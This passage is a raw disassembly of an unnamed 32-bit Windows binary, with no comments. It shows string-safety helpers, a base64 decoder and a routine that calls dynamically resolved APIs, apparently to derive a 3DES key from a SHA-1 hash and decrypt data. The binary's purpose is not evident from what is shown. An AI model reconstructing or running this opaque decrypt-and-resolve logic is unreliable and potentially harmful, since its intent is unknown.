  410c44:	mov    DWORD PTR [eax],edi
  410c46:	mov    eax,DWORD PTR [ebp+0xc]
  410c49:	test   eax,eax
  410c4b:	je     0x410c5a
  410c4d:	mov    DWORD PTR [eax],ebx
  410c4f:	jmp    0x410c5a
  410c51:	test   edi,edi
  410c53:	je     0x410c5a
  410c55:	xor    eax,eax
  410c57:	mov    WORD PTR [ecx],ax
  410c5a:	pop    edi
  410c5b:	mov    eax,esi
  410c5d:	pop    esi
  410c5e:	pop    ebx
  410c5f:	mov    esp,ebp
  410c61:	pop    ebp
  410c62:	ret    0x14
  410c65:	int3   
  410c66:	int3   
  410c67:	int3   
  410c68:	int3   
  410c69:	int3   
  410c6a:	mov    edi,edi
  410c6c:	push   ebp
  410c6d:	mov    ebp,esp
  410c6f:	push   esi
  410c70:	xor    esi,esi
  410c72:	push   edi
  410c73:	mov    edi,edx
  410c75:	test   edx,edx
  410c77:	je     0x410c88
  410c79:	cmp    BYTE PTR [ecx],0x0
  410c7c:	je     0x410c84
  410c7e:	inc    ecx
  410c7f:	sub    edx,0x1
  410c82:	jne    0x410c79
  410c84:	test   edx,edx
  410c86:	jne    0x410c8d
  410c88:	mov    esi,0x80070057
  410c8d:	mov    eax,DWORD PTR [ebp+0x8]
  410c90:	test   eax,eax
  410c92:	je     0x410ca1
  410c94:	test   esi,esi
  410c96:	js     0x410c9e
  410c98:	sub    edi,edx
  410c9a:	mov    DWORD PTR [eax],edi
  410c9c:	jmp    0x410ca1
  410c9e:	and    DWORD PTR [eax],0x0
  410ca1:	pop    edi
  410ca2:	mov    eax,esi
  410ca4:	pop    esi
  410ca5:	pop    ebp
  410ca6:	ret    0x4
  410ca9:	int3   
  410caa:	int3   
  410cab:	int3   
  410cac:	int3   
  410cad:	int3   
  410cae:	mov    edi,edi
  410cb0:	push   ebp
  410cb1:	mov    ebp,esp
  410cb3:	xor    eax,eax
  410cb5:	test   edx,edx
  410cb7:	je     0x410cc8
  410cb9:	cmp    DWORD PTR [edx],0x7fffffff
  410cbf:	jb     0x410cc8
  410cc1:	mov    eax,0x80070057
  410cc6:	jmp    0x410ce1
  410cc8:	test   DWORD PTR [ebp+0xc],0x100
  410ccf:	je     0x410ce1
  410cd1:	cmp    DWORD PTR [ecx],eax
  410cd3:	jne    0x410ce1
  410cd5:	mov    DWORD PTR [ecx],0x401068
  410cdb:	test   edx,edx
  410cdd:	je     0x410ce1
  410cdf:	mov    DWORD PTR [edx],eax
  410ce1:	pop    ebp
  410ce2:	ret    0x8
  410ce5:	int3   
  410ce6:	int3   
  410ce7:	int3   
  410ce8:	int3   
  410ce9:	int3   
  410cea:	mov    edi,edi
  410cec:	push   ebp
  410ced:	mov    ebp,esp
  410cef:	push   ecx
  410cf0:	push   esi
  410cf1:	xor    eax,eax
  410cf3:	xor    esi,esi
  410cf5:	mov    DWORD PTR [ebp-0x4],eax
  410cf8:	test   edx,edx
  410cfa:	je     0x410d26
  410cfc:	push   ebx
  410cfd:	push   edi
  410cfe:	mov    edi,DWORD PTR [ebp+0xc]
  410d01:	mov    ebx,0x7ffffffe
  410d06:	sub    edi,ecx
  410d08:	test   ebx,ebx
  410d0a:	je     0x410d1d
  410d0c:	mov    al,BYTE PTR [edi+ecx*1]
  410d0f:	test   al,al
  410d11:	je     0x410d1d
  410d13:	mov    BYTE PTR [ecx],al
  410d15:	inc    ecx
  410d16:	dec    ebx
  410d17:	inc    esi
  410d18:	sub    edx,0x1
  410d1b:	jne    0x410d08
  410d1d:	mov    eax,DWORD PTR [ebp-0x4]
  410d20:	pop    edi
  410d21:	pop    ebx
  410d22:	test   edx,edx
  410d24:	jne    0x410d2d
  410d26:	dec    ecx
  410d27:	mov    eax,0x8007007a
  410d2c:	dec    esi
  410d2d:	mov    BYTE PTR [ecx],0x0
  410d30:	mov    ecx,DWORD PTR [ebp+0x8]
  410d33:	test   ecx,ecx
  410d35:	je     0x410d39
  410d37:	mov    DWORD PTR [ecx],esi
  410d39:	pop    esi
  410d3a:	mov    esp,ebp
  410d3c:	pop    ebp
  410d3d:	ret    0xc
  410d40:	int3   
  410d41:	int3   
  410d42:	int3   
  410d43:	int3   
  410d44:	int3   
  410d45:	mov    edi,edi
  410d47:	push   ebp
  410d48:	mov    ebp,esp
  410d4a:	xor    eax,eax
  410d4c:	push   esi
  410d4d:	mov    esi,eax
  410d4f:	test   edx,edx
  410d51:	je     0x410d80
  410d53:	push   ebx
  410d54:	mov    ebx,DWORD PTR [ebp+0x10]
  410d57:	push   edi
  410d58:	mov    edi,DWORD PTR [ebp+0xc]
  410d5b:	sub    edi,ecx
  410d5d:	test   ebx,ebx
  410d5f:	je     0x410d77
  410d61:	movzx  eax,WORD PTR [edi+ecx*1]
  410d65:	test   ax,ax
  410d68:	je     0x410d77
  410d6a:	mov    WORD PTR [ecx],ax
  410d6d:	add    ecx,0x2
  410d70:	dec    ebx
  410d71:	inc    esi
  410d72:	sub    edx,0x1
  410d75:	jne    0x410d5d
  410d77:	pop    edi
  410d78:	pop    ebx
  410d79:	push   0x0
  410d7b:	pop    eax
  410d7c:	test   edx,edx
  410d7e:	jne    0x410d89
  410d80:	sub    ecx,0x2
  410d83:	mov    eax,0x8007007a
  410d88:	dec    esi
  410d89:	xor    edx,edx
  410d8b:	mov    WORD PTR [ecx],dx
  410d8e:	mov    ecx,DWORD PTR [ebp+0x8]
  410d91:	test   ecx,ecx
  410d93:	je     0x410d97
  410d95:	mov    DWORD PTR [ecx],esi
  410d97:	pop    esi
  410d98:	pop    ebp
  410d99:	ret    0xc
  410d9c:	int3   
  410d9d:	int3   
  410d9e:	int3   
  410d9f:	int3   
  410da0:	int3   
  410da1:	mov    edi,edi
  410da3:	push   ebp
  410da4:	mov    ebp,esp
  410da6:	push   ebx
  410da7:	push   esi
  410da8:	push   edi
  410da9:	push   DWORD PTR [ebp+0x10]
  410dac:	lea    esi,[edx-0x1]
  410daf:	mov    edi,ecx
  410db1:	push   DWORD PTR [ebp+0xc]
  410db4:	xor    ebx,ebx
  410db6:	push   esi
  410db7:	push   edi
  410db8:	call   DWORD PTR ds:0x414208
  410dbe:	add    esp,0x10
  410dc1:	test   eax,eax
  410dc3:	js     0x410dcf
  410dc5:	cmp    eax,esi
  410dc7:	ja     0x410dcf
  410dc9:	je     0x410dd4
  410dcb:	mov    esi,eax
  410dcd:	jmp    0x410dda
  410dcf:	mov    ebx,0x8007007a
  410dd4:	xor    eax,eax
  410dd6:	mov    WORD PTR [edi+esi*2],ax
  410dda:	mov    ecx,DWORD PTR [ebp+0x8]
  410ddd:	test   ecx,ecx
  410ddf:	je     0x410de3
  410de1:	mov    DWORD PTR [ecx],esi
  410de3:	pop    edi
  410de4:	pop    esi
  410de5:	mov    eax,ebx
  410de7:	pop    ebx
  410de8:	pop    ebp
  410de9:	ret    0xc
  410dec:	int3   
  410ded:	int3   
  410dee:	int3   
  410def:	int3   
  410df0:	int3   
  410df1:	mov    edi,edi
  410df3:	push   ebp
  410df4:	mov    ebp,esp
  410df6:	cmp    edx,0x1
  410df9:	jbe    0x410e10
  410dfb:	lea    eax,[edx-0x1]
  410dfe:	push   eax
  410dff:	movzx  eax,BYTE PTR [ebp+0x8]
  410e03:	push   eax
  410e04:	lea    eax,[ecx+0x1]
  410e07:	push   eax
  410e08:	call   0x412060
  410e0d:	add    esp,0xc
  410e10:	xor    eax,eax
  410e12:	pop    ebp
  410e13:	ret    0x4
  410e16:	int3   
  410e17:	int3   
  410e18:	int3   
  410e19:	int3   
  410e1a:	int3   
  410e1b:	mov    edi,edi
  410e1d:	push   ebp
  410e1e:	mov    ebp,esp
  410e20:	push   ebx
  410e21:	push   edi
  410e22:	mov    edi,edx
  410e24:	mov    ebx,ecx
  410e26:	test   edi,edi
  410e28:	je     0x410e4a
  410e2a:	test   DWORD PTR [ebp+0x14],0x1000
  410e31:	je     0x410e4a
  410e33:	mov    ecx,DWORD PTR [ebp+0x8]
  410e36:	mov    eax,DWORD PTR [ebp+0xc]
  410e39:	lea    edx,[ebx+ecx*1]
  410e3c:	mov    DWORD PTR [eax],edx
  410e3e:	mov    eax,edi
  410e40:	sub    eax,ecx
  410e42:	mov    BYTE PTR [edx],0x0
  410e45:	mov    ecx,DWORD PTR [ebp+0x10]
  410e48:	mov    DWORD PTR [ecx],eax
  410e4a:	test   DWORD PTR [ebp+0x14],0x400
  410e51:	je     0x410e97
  410e53:	push   esi
  410e54:	mov    esi,DWORD PTR [ebp+0x14]
  410e57:	push   edi
  410e58:	and    esi,0xff
  410e5e:	push   esi
  410e5f:	push   ebx
  410e60:	call   0x412060
  410e65:	add    esp,0xc
  410e68:	test   esi,esi
  410e6a:	pop    esi
  410e6b:	jne    0x410e79
  410e6d:	mov    ecx,DWORD PTR [ebp+0xc]
  410e70:	mov    eax,DWORD PTR [ebp+0x10]
  410e73:	mov    DWORD PTR [ecx],ebx
  410e75:	mov    DWORD PTR [eax],edi
  410e77:	jmp    0x410e9d
  410e79:	test   edi,edi
  410e7b:	je     0x410eb1
  410e7d:	mov    ecx,DWORD PTR [ebp+0xc]
  410e80:	lea    eax,[edi-0x1]
  410e83:	add    eax,ebx
  410e85:	mov    DWORD PTR [ecx],eax
  410e87:	mov    ecx,DWORD PTR [ebp+0x10]
  410e8a:	mov    BYTE PTR [eax],0x0
  410e8d:	mov    eax,ecx
  410e8f:	mov    DWORD PTR [ecx],0x1
  410e95:	jmp    0x410e9a
  410e97:	mov    eax,DWORD PTR [ebp+0x10]
  410e9a:	mov    ecx,DWORD PTR [ebp+0xc]
  410e9d:	test   edi,edi
  410e9f:	je     0x410eb1
  410ea1:	test   DWORD PTR [ebp+0x14],0x800
  410ea8:	je     0x410eb1
  410eaa:	mov    DWORD PTR [ecx],ebx
  410eac:	mov    DWORD PTR [eax],edi
  410eae:	mov    BYTE PTR [ebx],0x0
  410eb1:	pop    edi
  410eb2:	xor    eax,eax
  410eb4:	pop    ebx
  410eb5:	pop    ebp
  410eb6:	ret    0x10
  410eb9:	int3   
  410eba:	int3   
  410ebb:	int3   
  410ebc:	int3   
  410ebd:	int3   
  410ebe:	mov    edi,edi
  410ec0:	push   ebp
  410ec1:	mov    ebp,esp
  410ec3:	push   esi
  410ec4:	push   DWORD PTR [ebp+0x14]
  410ec7:	push   ecx
  410ec8:	push   ecx
  410ec9:	push   DWORD PTR [ebp+0x8]
  410ecc:	call   0x4064d3
  410ed1:	mov    esi,eax
  410ed3:	test   esi,esi
  410ed5:	jns    0x410eeb
  410ed7:	push   esi
  410ed8:	push   0x4051fc
  410edd:	push   DWORD PTR ds:0x4130e8
  410ee3:	call   0x40e7a0
  410ee8:	add    esp,0xc
  410eeb:	mov    eax,esi
  410eed:	pop    esi
  410eee:	pop    ebp
  410eef:	ret    0x10
  410ef2:	int3   
  410ef3:	int3   
  410ef4:	int3   
  410ef5:	int3   
  410ef6:	int3   
  410ef7:	mov    edi,edi
  410ef9:	push   ebp
  410efa:	mov    ebp,esp
  410efc:	push   esi
  410efd:	sub    esp,0xc
  410f00:	push   DWORD PTR [ebp+0xc]
  410f03:	push   DWORD PTR [ebp+0x8]
  410f06:	call   0x4108bb
  410f0b:	mov    esi,eax
  410f0d:	test   esi,esi
  410f0f:	jns    0x410f25
  410f11:	push   esi
  410f12:	push   0x405228
  410f17:	push   DWORD PTR ds:0x4130e8
  410f1d:	call   0x40e7a0
  410f22:	add    esp,0xc
  410f25:	mov    eax,esi
  410f27:	pop    esi
  410f28:	pop    ebp
  410f29:	ret    0x14
  410f2c:	int3   
  410f2d:	int3   
  410f2e:	int3   
  410f2f:	int3   
  410f30:	int3   
  410f31:	mov    edi,edi
  410f33:	push   ebp
  410f34:	mov    ebp,esp
  410f36:	push   esi
  410f37:	sub    esp,0xc
  410f3a:	push   DWORD PTR [ebp+0x8]
  410f3d:	call   0x40c8f2
  410f42:	mov    esi,eax
  410f44:	test   esi,esi
  410f46:	jns    0x410f5c
  410f48:	push   esi
  410f49:	push   0x405254
  410f4e:	push   DWORD PTR ds:0x4130e8
  410f54:	call   0x40e7a0
  410f59:	add    esp,0xc
  410f5c:	mov    eax,esi
  410f5e:	pop    esi
  410f5f:	pop    ebp
  410f60:	ret    0x10
  410f63:	int3   
  410f64:	int3   
  410f65:	int3   
  410f66:	int3   
  410f67:	int3   
  410f68:	mov    edi,edi
  410f6a:	push   esi
  410f6b:	sub    esp,0x10
  410f6e:	call   0x410977
  410f73:	mov    esi,eax
  410f75:	test   esi,esi
  410f77:	jns    0x410f8d
  410f79:	push   esi
  410f7a:	push   0x405254
  410f7f:	push   DWORD PTR ds:0x4130e8
  410f85:	call   0x40e7a0
  410f8a:	add    esp,0xc
  410f8d:	mov    eax,esi
  410f8f:	pop    esi
  410f90:	ret    0x10
  410f93:	int3   
  410f94:	int3   
  410f95:	int3   
  410f96:	int3   
  410f97:	int3   
  410f98:	mov    edi,edi
  410f9a:	push   ebp
  410f9b:	mov    ebp,esp
  410f9d:	mov    edx,DWORD PTR [ebp+0xc]
  410fa0:	lea    eax,[ebp+0x20]
  410fa3:	mov    ecx,DWORD PTR [ebp+0x8]
  410fa6:	push   esi
  410fa7:	push   eax
  410fa8:	push   DWORD PTR [ebp+0x1c]
  410fab:	push   DWORD PTR [ebp+0x18]
  410fae:	push   DWORD PTR [ebp+0x14]
  410fb1:	push   DWORD PTR [ebp+0x10]
  410fb4:	call   0x410b32
  410fb9:	mov    esi,eax
  410fbb:	test   esi,esi
  410fbd:	jns    0x410fd3
  410fbf:	push   esi
  410fc0:	push   0x40527c
  410fc5:	push   DWORD PTR ds:0x4130e8
  410fcb:	call   0x40e7a0
  410fd0:	add    esp,0xc
  410fd3:	mov    eax,esi
  410fd5:	pop    esi
  410fd6:	pop    ebp
  410fd7:	ret    
  410fd8:	int3   
  410fd9:	int3   
  410fda:	int3   
  410fdb:	int3   
  410fdc:	int3   
  410fdd:	mov    edi,edi
  410fdf:	push   ebp
  410fe0:	mov    ebp,esp
  410fe2:	mov    edx,DWORD PTR [ebp+0xc]
  410fe5:	lea    eax,[ebp+0x20]
  410fe8:	mov    ecx,DWORD PTR [ebp+0x8]
  410feb:	push   esi
  410fec:	push   eax
  410fed:	push   DWORD PTR [ebp+0x1c]
  410ff0:	push   DWORD PTR [ebp+0x18]
  410ff3:	push   DWORD PTR [ebp+0x14]
  410ff6:	push   DWORD PTR [ebp+0x10]
  410ff9:	call   0x410a13
  410ffe:	mov    esi,eax
  411000:	test   esi,esi
  411002:	jns    0x411018
  411004:	push   esi
  411005:	push   0x40527c
  41100a:	push   DWORD PTR ds:0x4130e8
  411010:	call   0x40e7a0
  411015:	add    esp,0xc
  411018:	mov    eax,esi
  41101a:	pop    esi
  41101b:	pop    ebp
  41101c:	ret    
  41101d:	int3   
  41101e:	int3   
  41101f:	int3   
  411020:	int3   
  411021:	int3   
  411022:	mov    edi,edi
  411024:	push   esi
  411025:	push   0x34
  411027:	call   DWORD PTR ds:0x4141b0
  41102d:	mov    esi,eax
  41102f:	test   esi,esi
  411031:	je     0x411048
  411033:	and    DWORD PTR [esi],0x0
  411036:	lea    eax,[esi+0x4]
  411039:	push   0x30
  41103b:	push   0x0
  41103d:	push   eax
  41103e:	call   0x412060
  411043:	add    esp,0xc
  411046:	jmp    0x41104a
  411048:	xor    esi,esi
  41104a:	test   esi,esi
  41104c:	je     0x411065
  41104e:	mov    ecx,esi
  411050:	call   0x411358
  411055:	test   eax,eax
  411057:	je     0x41105d
  411059:	mov    eax,esi
  41105b:	pop    esi
  41105c:	ret    
  41105d:	push   ecx
  41105e:	mov    ecx,esi
  411060:	call   0x41106e
  411065:	xor    eax,eax
  411067:	pop    esi
  411068:	ret    
  411069:	int3   
  41106a:	int3   
  41106b:	int3   
  41106c:	int3   
  41106d:	int3   
  41106e:	mov    edi,edi
  411070:	push   ebp
  411071:	mov    ebp,esp
  411073:	push   ecx
  411074:	mov    eax,ds:0x413004
  411079:	xor    eax,ebp
  41107b:	mov    DWORD PTR [ebp-0x4],eax
  41107e:	push   esi
  41107f:	mov    esi,ecx
  411081:	push   edi
  411082:	cmp    DWORD PTR [esi],0x0
  411085:	je     0x41109c
  411087:	mov    edi,DWORD PTR [esi+0x28]
  41108a:	test   edi,edi
  41108c:	je     0x41109c
  41108e:	push   0x0
  411090:	push   DWORD PTR [esi]
  411092:	mov    ecx,edi
  411094:	call   DWORD PTR ds:0x414220
  41109a:	call   edi
  41109c:	lea    edi,[esi+0x4]
  41109f:	cmp    DWORD PTR [edi],0x0
  4110a2:	je     0x4110b9
  4110a4:	push   DWORD PTR [edi]
  4110a6:	call   DWORD PTR ds:0x414120
  4110ac:	push   0x30
  4110ae:	push   0x0
  4110b0:	push   edi
  4110b1:	call   0x412060
  4110b6:	add    esp,0xc
  4110b9:	push   esi
  4110ba:	call   DWORD PTR ds:0x4141bc
  4110c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4110c3:	mov    eax,esi
  4110c5:	pop    edi
  4110c6:	xor    ecx,ebp
  4110c8:	pop    esi
  4110c9:	call   0x411980
  4110ce:	mov    esp,ebp
  4110d0:	pop    ebp
  4110d1:	ret    0x4
  4110d4:	int3   
  4110d5:	int3   
  4110d6:	int3   
  4110d7:	int3   
  4110d8:	int3   
  4110d9:	mov    edi,edi
  4110db:	push   ebp
  4110dc:	mov    ebp,esp
  4110de:	sub    esp,0xc
  4110e1:	push   esi
  4110e2:	push   edi
  4110e3:	mov    esi,ecx
  4110e5:	mov    edi,edx
  4110e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4110ea:	mov    DWORD PTR [ebp-0xc],edi
  4110ed:	test   ecx,ecx
  4110ef:	jne    0x4110f8
  4110f1:	xor    eax,eax
  4110f3:	jmp    0x4111eb
  4110f8:	mov    al,BYTE PTR [esi]
  4110fa:	cmp    al,0x20
  4110fc:	je     0x411102
  4110fe:	cmp    al,0x9
  411100:	jne    0x411105
  411102:	inc    esi
  411103:	jmp    0x4110f8
  411105:	push   ebx
  411106:	mov    ebx,esi
  411108:	movsx  eax,BYTE PTR [ebx]
  41110b:	inc    ebx
  41110c:	cmp    DWORD PTR [eax*4+0x4052b0],0x3f
  411114:	jle    0x411108
  411116:	sub    ebx,esi
  411118:	dec    ebx
  411119:	lea    eax,[ebx+0x3]
  41111c:	cdq    
  41111d:	and    edx,0x3
  411120:	add    eax,edx
  411122:	sar    eax,0x2
  411125:	imul   edx,eax,0x3
  411128:	mov    DWORD PTR [ebp-0x8],edx
  41112b:	lea    eax,[edx+0x4]
  41112e:	cmp    eax,edx
  411130:	jb     0x4111e8
  411136:	cmp    DWORD PTR [ecx],eax
  411138:	jb     0x4111e8
  41113e:	mov    DWORD PTR [ebp-0x4],edi
  411141:	test   ebx,ebx
  411143:	jle    0x4111c4
  411145:	mov    edx,DWORD PTR [ebp-0x4]
  411148:	lea    edi,[ebx-0x1]
  41114b:	shr    edi,0x2
  41114e:	inc    edi
  41114f:	imul   eax,edi,0xfffffffc
  411152:	add    ebx,eax
  411154:	movsx  eax,BYTE PTR [esi+0x1]
  411158:	mov    ecx,DWORD PTR [eax*4+0x4052b0]
  41115f:	movsx  eax,BYTE PTR [esi]
  411162:	sar    ecx,0x4
  411165:	mov    al,BYTE PTR [eax*4+0x4052b0]
  41116c:	shl    al,0x2
  41116f:	or     cl,al
  411171:	mov    BYTE PTR [edx],cl
  411173:	lea    edx,[edx+0x3]
  411176:	movsx  eax,BYTE PTR [esi+0x2]
  41117a:	mov    ecx,DWORD PTR [eax*4+0x4052b0]
  411181:	movsx  eax,BYTE PTR [esi+0x1]
  411185:	sar    ecx,0x2
  411188:	mov    al,BYTE PTR [eax*4+0x4052b0]
  41118f:	shl    al,0x4
  411192:	or     cl,al
  411194:	mov    BYTE PTR [edx-0x2],cl
  411197:	movsx  eax,BYTE PTR [esi+0x2]
  41119b:	mov    cl,BYTE PTR [eax*4+0x4052b0]
  4111a2:	movsx  eax,BYTE PTR [esi+0x3]
  4111a6:	add    esi,0x4
  4111a9:	shl    cl,0x6
  4111ac:	or     cl,BYTE PTR [eax*4+0x4052b0]
  4111b3:	mov    BYTE PTR [edx-0x1],cl
  4111b6:	sub    edi,0x1
  4111b9:	jne    0x411154
  4111bb:	mov    edx,DWORD PTR [ebp-0x8]
  4111be:	mov    ecx,DWORD PTR [ebp+0x8]
  4111c1:	mov    edi,DWORD PTR [ebp-0xc]
  4111c4:	test   bl,0x3
  4111c7:	je     0x4111dd
  4111c9:	movsx  eax,BYTE PTR [esi-0x2]
  4111cd:	cmp    DWORD PTR [eax*4+0x4052b0],0x3f
  4111d5:	jle    0x4111dc
  4111d7:	sub    edx,0x2
  4111da:	jmp    0x4111dd
  4111dc:	dec    edx
  4111dd:	xor    eax,eax
  4111df:	mov    DWORD PTR [ecx],edx
  4111e1:	mov    BYTE PTR [edx+edi*1],0x0
  4111e5:	inc    eax
  4111e6:	jmp    0x4111ea
  4111e8:	xor    eax,eax
  4111ea:	pop    ebx
  4111eb:	pop    edi
  4111ec:	pop    esi
  4111ed:	mov    esp,ebp
  4111ef:	pop    ebp
  4111f0:	ret    0x4
  4111f3:	int3   
  4111f4:	int3   
  4111f5:	int3   
  4111f6:	int3   
  4111f7:	int3   
  4111f8:	mov    edi,edi
  4111fa:	push   ebp
  4111fb:	mov    ebp,esp
  4111fd:	push   ecx
  4111fe:	mov    eax,ds:0x413004
  411203:	xor    eax,ebp
  411205:	mov    DWORD PTR [ebp-0x4],eax
  411208:	push   esi
  411209:	mov    esi,DWORD PTR [ecx+0x8]
  41120c:	xor    eax,eax
  41120e:	test   esi,esi
  411210:	je     0x41122e
  411212:	push   DWORD PTR [ebp+0x18]
  411215:	mov    ecx,esi
  411217:	push   0x1
  411219:	push   0x4057d8
  41121e:	push   0x405808
  411223:	push   DWORD PTR [ebp+0x8]
  411226:	call   DWORD PTR ds:0x414220
  41122c:	call   esi
  41122e:	mov    ecx,DWORD PTR [ebp-0x4]
  411231:	xor    ecx,ebp
  411233:	pop    esi
  411234:	call   0x411980
  411239:	mov    esp,ebp
  41123b:	pop    ebp
  41123c:	ret    0x14
  41123f:	int3   
  411240:	int3   
  411241:	int3   
  411242:	int3   
  411243:	int3   
  411244:	mov    edi,edi
  411246:	push   ebp
  411247:	mov    ebp,esp
  411249:	push   ecx
  41124a:	push   ecx
  41124b:	mov    eax,ds:0x413004
  411250:	xor    eax,ebp
  411252:	mov    DWORD PTR [ebp-0x4],eax
  411255:	push   ebx
  411256:	push   esi
  411257:	mov    esi,ecx
  411259:	xor    ebx,ebx
  41125b:	push   edi
  41125c:	mov    DWORD PTR [ebp-0x8],ebx
  41125f:	mov    edi,DWORD PTR [esi+0xc]
  411262:	test   edi,edi
  411264:	je     0x41130b
  41126a:	lea    eax,[ebp-0x8]
  41126d:	mov    ecx,edi
  41126f:	push   eax
  411270:	push   ebx
  411271:	push   ebx
  411272:	push   0x8004
  411277:	push   DWORD PTR [esi]
  411279:	call   DWORD PTR ds:0x414220
  41127f:	call   edi
  411281:	test   eax,eax
  411283:	je     0x41130b
  411289:	push   DWORD PTR [ebp+0xc]
  41128c:	call   DWORD PTR ds:0x414094
  411292:	mov    edi,DWORD PTR [esi+0x24]
  411295:	test   edi,edi
  411297:	je     0x4112fd
  411299:	push   ebx
  41129a:	push   eax
  41129b:	push   DWORD PTR [ebp+0xc]
  41129e:	mov    ecx,edi
  4112a0:	push   DWORD PTR [ebp-0x8]
  4112a3:	call   DWORD PTR ds:0x414220
  4112a9:	call   edi
  4112ab:	test   eax,eax
  4112ad:	je     0x4112fd
  4112af:	mov    edi,DWORD PTR [esi+0x14]
  4112b2:	test   edi,edi
  4112b4:	je     0x4112ef
  4112b6:	push   DWORD PTR [ebp+0x8]
  4112b9:	mov    ecx,edi
  4112bb:	push   0xa80000
  4112c0:	push   DWORD PTR [ebp-0x8]
  4112c3:	push   0x6603
  4112c8:	push   DWORD PTR [esi]
  4112ca:	call   DWORD PTR ds:0x414220
  4112d0:	call   edi
  4112d2:	test   eax,eax
  4112d4:	je     0x4112ef
  4112d6:	mov    esi,DWORD PTR [esi+0x18]
  4112d9:	test   esi,esi
  4112db:	je     0x4112ea
  4112dd:	push   DWORD PTR [ebp-0x8]
  4112e0:	mov    ecx,esi
  4112e2:	call   DWORD PTR ds:0x414220
  4112e8:	call   esi
  4112ea:	xor    eax,eax
  4112ec:	inc    eax
  4112ed:	jmp    0x411340
  4112ef:	call   DWORD PTR ds:0x414074
  4112f5:	push   eax
  4112f6:	push   0x4056f4
  4112fb:	jmp    0x411317
  4112fd:	call   DWORD PTR ds:0x414074
  411303:	push   eax
  411304:	push   0x4056d4
  411309:	jmp    0x411317
  41130b:	call   DWORD PTR ds:0x414074
  411311:	push   eax
  411312:	push   0x4056b0
  411317:	push   DWORD PTR ds:0x4130e8
  41131d:	call   0x40e7a0
  411322:	add    esp,0xc
  411325:	cmp    DWORD PTR [ebp-0x8],ebx
  411328:	je     0x41133e
  41132a:	mov    esi,DWORD PTR [esi+0x18]
  41132d:	test   esi,esi
  41132f:	je     0x41133e
  411331:	push   DWORD PTR [ebp-0x8]
  411334:	mov    ecx,esi
  411336:	call   DWORD PTR ds:0x414220
  41133c:	call   esi
  41133e:	xor    eax,eax
  411340:	mov    ecx,DWORD PTR [ebp-0x4]
  411343:	pop    edi
  411344:	pop    esi
  411345:	xor    ecx,ebp
  411347:	pop    ebx
  411348:	call   0x411980
  41134d:	mov    esp,ebp
  41134f:	pop    ebp
  411350:	ret    0xc
  411353:	int3   
  411354:	int3   
  411355:	int3   
  411356:	int3   
  411357:	int3   
  411358:	mov    edi,edi
  41135a:	push   ebp
  41135b:	mov    ebp,esp
  41135d:	sub    esp,0x30
  411360:	mov    eax,ds:0x413004
  411365:	xor    eax,ebp
  411367:	mov    DWORD PTR [ebp-0x4],eax
  41136a:	and    DWORD PTR [ebp-0x8],0x0
  41136e:	mov    edx,0x4057c8
  411373:	push   esi
  411374:	mov    esi,ecx
  411376:	mov    DWORD PTR [ebp-0x30],0x405718
  41137d:	push   0xb
  41137f:	mov    DWORD PTR [ebp-0x2c],0x405730
  411386:	mov    DWORD PTR [ebp-0x28],0x405740
  41138d:	lea    eax,[esi+0x8]
  411390:	mov    DWORD PTR [ebp-0x24],0x405750
  411397:	push   eax
  411398:	lea    eax,[ebp-0x30]
  41139b:	mov    DWORD PTR [ebp-0x20],0x405760
  4113a2:	push   eax
  4113a3:	lea    ecx,[esi+0x4]
  4113a6:	mov    DWORD PTR [ebp-0x1c],0x405774
  4113ad:	mov    DWORD PTR [ebp-0x18],0x405784
  4113b4:	mov    DWORD PTR [ebp-0x14],0x405794
  4113bb:	mov    DWORD PTR [ebp-0x10],0x4057a4
  4113c2:	mov    DWORD PTR [ebp-0xc],0x4057b8
  4113c9:	call   0x40fb2f
  4113ce:	test   eax,eax
  4113d0:	je     0x41143c
  4113d2:	push   0x0
  4113d4:	sub    esp,0xc
  4113d7:	mov    ecx,esi
  4113d9:	push   esi
  4113da:	call   0x4111f8
  4113df:	test   eax,eax
  4113e1:	jne    0x411467
  4113e7:	call   DWORD PTR ds:0x414074
  4113ed:	push   eax
  4113ee:	push   0x405820
  4113f3:	push   DWORD PTR ds:0x4130e8
  4113f9:	call   0x40e7a0
  4113fe:	push   0x405864
  411403:	push   DWORD PTR ds:0x4130e8
  411409:	call   0x40e7a0
  41140e:	add    esp,0x14
  411411:	mov    ecx,esi
  411413:	push   0x8
  411415:	sub    esp,0xc
  411418:	push   esi
  411419:	call   0x4111f8
  41141e:	test   eax,eax
  411420:	jne    0x411467
  411422:	call   DWORD PTR ds:0x414074
  411428:	push   eax
  411429:	push   0x405898
  41142e:	push   DWORD PTR ds:0x4130e8
  411434:	call   0x40e7a0
  411439:	add    esp,0xc
  41143c:	mov    eax,DWORD PTR [esi]
  41143e:	test   eax,eax
  411440:	je     0x411456
  411442:	mov    esi,DWORD PTR [esi+0x28]
  411445:	test   esi,esi
  411447:	je     0x411456
  411449:	push   0x0
  41144b:	push   eax
  41144c:	mov    ecx,esi
  41144e:	call   DWORD PTR ds:0x414220
  411454:	call   esi
  411456:	xor    eax,eax
  411458:	mov    ecx,DWORD PTR [ebp-0x4]
  41145b:	xor    ecx,ebp
  41145d:	pop    esi
  41145e:	call   0x411980
  411463:	mov    esp,ebp
  411465:	pop    ebp
  411466:	ret    
  411467:	xor    eax,eax
  411469:	inc    eax
  41146a:	jmp    0x411458
  41146c:	int3   
  41146d:	int3   
  41146e:	int3   
  41146f:	int3   
  411470:	int3   
  411471:	mov    edi,edi
  411473:	push   ebp
  411474:	mov    ebp,esp
  411476:	sub    esp,0x10
  411479:	mov    eax,ds:0x413004
  41147e:	xor    eax,ebp
  411480:	mov    DWORD PTR [ebp-0x4],eax
  411483:	mov    eax,ds:0x4138fc
  411488:	push   ebx
  411489:	xor    ebx,ebx
  41148b:	mov    DWORD PTR [ebp-0xc],eax
  41148e:	push   esi
  41148f:	push   edi
  411490:	mov    DWORD PTR [ebp-0x10],ebx
  411493:	cmp    DWORD PTR [eax],ebx
  411495:	je     0x4115e0
  41149b:	mov    edi,DWORD PTR [ebp+0x10]
  41149e:	test   edi,edi
  4114a0:	je     0x4115e0
  4114a6:	push   ecx
  4114a7:	push   DWORD PTR [ebp+0x8]
  4114aa:	lea    ecx,[ebp-0x10]
  4114ad:	push   ecx
  4114ae:	mov    ecx,eax
  4114b0:	call   0x411244
  4114b5:	test   eax,eax
  4114b7:	jne    0x4114c0
  4114b9:	push   0x2
  4114bb:	jmp    0x4115c6
  4114c0:	lea    esi,[edi+0x100]
  4114c6:	cmp    esi,edi
  4114c8:	jb     0x4115c9
  4114ce:	cmp    esi,0x2800
  4114d4:	jae    0x411597
  4114da:	mov    edi,DWORD PTR [ebp+0x14]
